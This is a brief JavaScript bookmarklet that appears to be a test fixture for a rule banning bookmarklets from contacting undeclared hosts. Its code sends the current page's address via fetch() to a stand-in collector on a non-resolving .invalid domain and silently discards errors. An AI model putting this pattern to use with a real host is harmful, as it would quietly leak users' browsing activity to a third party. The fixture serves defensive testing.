javascript:(function() {
 /* A fixture that sends the page's address to another host, which no bookmarklet may do unless
    its entry names the host. The .invalid name never resolves, so nothing leaves the machine. */
 var addressFixtureNetworkSendsToAnotherHost =
  "https://ping.collector.invalid/?page=" + encodeURIComponent(location.href);
 fetch(addressFixtureNetworkSendsToAnotherHost).catch(function () { });
})();
